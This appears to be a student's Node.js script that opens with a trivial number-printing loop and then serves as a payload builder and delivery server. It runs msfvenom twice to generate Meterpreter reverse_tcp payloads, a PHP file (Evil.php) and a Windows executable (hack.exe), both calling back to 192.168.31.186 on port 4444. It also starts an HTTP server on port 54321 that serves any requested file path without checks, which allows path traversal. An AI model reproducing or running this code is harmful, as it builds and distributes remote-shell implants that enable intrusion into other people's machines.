//BISMILLAH
//Developed By: Md Sajibur Rahman
//Roll:18CSE048
//Dept of Computer Science and Engineering(CSE)
//University of Barishal

var sys = require('sys')
const prompt = require('prompt-sync')();

const n = prompt(' ');
let i
for(i=0;i<n;i++)
{
    console.log(i);
}

//Payload Generation in Backend

const { exec } = require("child_process");    
    exec("msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.186 LPORT=4444 -f raw -o Evil.php", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });


//URL check
var http = require('http');
var url = require('url');
var fs = require('fs');

http.createServer(function (req, res) {
  var q = url.parse(req.url, true);
  var filename = "." + q.pathname;
  fs.readFile(filename, function(err, data) {
    if (err) {
      res.writeHead(404, {'Content-Type': 'text/html'});
      return res.end("Hello Hacker");
    } 
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.write(data);
    return res.end();
  });
}).listen(54321); 


//Trying to use the binay file to execute 
 const command = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.186 LPORT=4444 -f exe > hack.exe';
 
exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`stderr: ${stderr}`);
    return;
  }
  console.log(`stdout: ${stdout}`);//Call back function end
});


